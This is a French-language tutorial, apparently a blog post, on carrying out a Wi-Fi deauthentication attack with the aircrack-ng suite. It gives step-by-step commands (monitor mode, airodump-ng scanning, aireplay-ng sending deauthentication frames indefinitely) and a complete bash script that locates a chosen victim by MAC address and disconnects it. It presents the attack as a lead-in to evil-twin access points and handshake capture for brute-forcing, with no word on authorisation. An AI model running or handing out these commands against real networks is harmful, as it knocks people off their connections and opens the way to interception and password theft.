---
weight: 4
title: "Attaque de désauthentification"
date: 2021-02-01T00:00:00+00:00
draft: false
author: "Nyxott"
description: "Effectuer une attaque de désauthentification Wi-Fi"
resources:
- name: "featured-image"
  src: "featured-image.png"

tags: ["Wi-Fi"]
categories: ["Wi-Fi"]

lightgallery: true
---

Cet article explique comment effectuer une attaque de désauthentification Wi-Fi.

<!--more-->

## Introduction

Une attaque de désauthentification Wi-Fi est une forme de déni de service ciblant la communication entre un client et un point d'accès Wi-Fi.

Cette attaque consiste à ce qu'un attaquant envoie des demandes de désauthentification à un accès Wi-Fi en se faisant passer pour un de ces clients. Cela a pour effet de déconnecter le client en question du point d'accès Wi-Fi.

Elle est, la plupart du temps, utilisé conjointement avec d'autres attaques.

Ainsi, un attaquant peut mettre en place un point d'accès Wi-Fi malveillant dans le cadre d'une attaque `Evil Twin`. Dans ce cas, l'attaquant pourra utiliser une attaque de désauthentification afin de déconnecter le client de son point d'accès Wi-Fi légitime pour le reconnecter sur le point d'accès malveillant.

Dans un autre contexte, un attaquant tentant de découvrir le mot de passe d'un point d'accès Wi-Fi peut utiliser cette méthode afin de déconnecter un client et récupérer le 4-Way Handshake pour ensuite effectuer une attaque brute-force.

Enfin, cette attaque de désauthentification peut tout simplement permettre de connaitre le SSID d'un point d'accès Wi-Fi caché.

## Installation des outils

On installe les outils nécessaires :
```shell
sudo apt install aircrack-ng
```

## Attaque

### Mode moniteur

Tout d'abord, il faut passer la carte Wi-Fi en mode moniteur afin de pouvoir écouter le trafic Wi-Fi environnant :
```shell
sudo airmon-ng start <INTERFACE>
```

{{< admonition >}}
Il est possible de trouver l'interface Wi-Fi via la commande suivante :
```shell
sudo iwconfig
```
{{< /admonition >}}

### Capture du trafic

Une fois la carte activée en mode moniteur, il est possible d'écouter le trafic Wi-Fi environnant grâce à la commande suivante :
```shell
sudo airodump-ng <INTERFACE>mon
```

Cette commande permet de récupérer énormément d'informations telles que, notamment :
* `BSSID` : L'adresse MAC du point d'accès ;
* `PWR` : La puissance du signal reçue. Plus le nombre est proche de 100, plus le signal est fort ; 
* `Data` : Le nombre de paquets de données capturés. Plus le nombre est élevé plus il y a d'activité ;
* `CH` : Le canal sur lequel la communication est effectuée ;
* `ENC` : L'algorithme de chiffrement utilisé ;
* `ESSID` : Le nom du point d'accès ;

De plus, elle permet également de récupérer l'adresse MAC des clients (STATION) connectés à chaque point d'accès détecté.

{{< admonition tip >}}
A tout moment, il est possible de couper l'écoute via un `ctrl + c`.
{{< /admonition >}}

### Alignement du canal

Une fois le point d'accès cible repéré, il est indispensable d'aligner la carte Wi-Fi sur le même canal que celui-ci afin de pouvoir correctement communiquer.

Cela est possible via la commande suivante :
```shell
sudo airodump-ng -d <BSSID> -c <CH> wlp2s0mon
```

{{< admonition tip >}}
Il est possible d'effectuer immédiatement un `ctrl + c` puisque l'aligmenent sur le bon canal est instantané.
{{< /admonition >}}

### Désauthentification

Une fois toutes ces étapes effectuées, il est désormais possible d'exécuter l'attaque via la commande suivante :
```shell
sudo aireplay-ng -0 0 -a <BSSID> -c <STATION> <INTERFACE>mon
```

{{< admonition >}}
Le `0` (à ne pas confondre avec le `-0`) permet d'envoyer des trames de désauthentification indéfiniment.
Il est possible de modifier ce nombre par `10`, par exemple, si l'on souhaite envoyer uniquement dix trames de désauthentification.
{{< /admonition >}}

{{< admonition tip >}}
Si l'option `-c <STATION>` n'est pas précisée, l'ensemble des clients connecté au point d'accès seront désauthentifiés.
{{< /admonition >}}

{{< admonition tip >}}
Lorsque des trames de désauthentification sont envoyées indéfiniment, il est possible d'effectuer un `ctrl + c` pour y mettre fin.
{{< /admonition >}}

### Mode station

Une fois l'attaque effectué, il est possible de désactiver le mode moniteur de la carte Wi-Fi via la commande suivante :
```shell
sudo airmon-ng stop <INTERFACE>mon
```

## Attaque automatisée

Répéter toutes ces commandes peut être contraignant notamment si l'on connaît déjà l'adresse MAC de la cible.

Partant de ce constat, la création d'un script automatisant cette attaque peut s'avérer utile.

```bash
#!/bin/bash

TARGET="<TARGET_MAC_ADDRESS>"

echo -e "\e[97mActivating monitor mode...\e[0m"
sudo airmon-ng start wlp2s0 > /dev/null 2>&1
echo -e "\e[1;92mOK\e[0m\n"

echo -e "\e[97mCleanning old file...\e[0m"
sudo rm airodump-01.csv > /dev/null 2>&1
echo -e "\e[1;92mOK\e[0m\n"

echo -e "\e[97mScanning access points...\e[0m"
sudo airodump-ng -w airodump --output-format csv wlp2s0mon > /dev/null 2>&1 &
sleep 20
sudo killall -15 airodump-ng > /dev/null 2>&1
echo -e "\e[1;92mOK\e[0m\n"

echo -e "\e[97mSearching target...\e[0m"
AP_TARGET=`grep $TARGET airodump-01.csv | cut -d "," -f 6 | xargs` > /dev/null 2>&1

if [ $AP_TARGET ]; then
	echo -e "\e[1;92mOK\e[0m\n"

	echo -e "\e[97mSearching additional information...\e[0m"
	TEMP=`grep $AP_TARGET airodump-01.csv | head -n 1`
	CHANNEL_TARGET=`echo $TEMP | cut -d "," -f 4 | xargs` > /dev/null 2>&1
	NAME_AP_TARGET=`echo $TEMP | cut -d "," -f 14 | xargs` > /dev/null 2>&1
	sudo airodump-ng -d $AP_TARGET -c $CHANNEL_TARGET wlp2s0mon > /dev/null 2>&1 &
	sleep 1
	sudo killall -15 airodump-ng > /dev/null 2>&1
	echo -e "\e[1;92mOK\e[0m\n"

	echo -e "\e[1;97m$TARGET\e[0m\e[97m detected on \e[0m\e[1;97m$NAME_AP_TARGET\e[0m\e[97m (\e[0m\e[1;97m$AP_TARGET\e[0m\e[97m)\e[0m\n"
	
	if [ "$1" = "attack" ]; then
		echo -e "\e[97mStarting attack...\e[0m"
		sudo aireplay-ng -0 0 -a $AP_TARGET -c $TARGET wlp2s0mon
		echo -e "\e[1;92mOK\e[0m\n"
	fi
else
	echo -e "\e[1;91mNO\e[0m\n"
fi

echo -e "\e[97mDeactivating monitor mode...\e[0m"
sudo airmon-ng stop wlp2s0mon > /dev/null 2>&1
echo -e "\e[1;92mOK\e[0m"

```

Il suffit d'indiquer l'adresse MAC de la cible et le script se chargera automatiquement de détecter si la cible est connectée à un point d'accès Wi-Fi. Si tel est le cas, le script enverra indéfiniment des trames de désauthentification au point d'accès Wi-Fi en question afin de désauthentifier la cible.

{{< admonition tip >}}
`./<SCRIPT_NAME>` : Permet de savoir si la cible est connectée ou non. Si elle l'est, le script indiquera sur quel point d'accès elle se trouve sans effectuer d'attaque.

`./<SCRIPT_NAME> attack` : Permet de savoir si la cible est connectée ou non. Si elle l'est, le script indiquera sur quel point d'accès elle se trouve et effectuera l'attaque.
{{< /admonition >}}
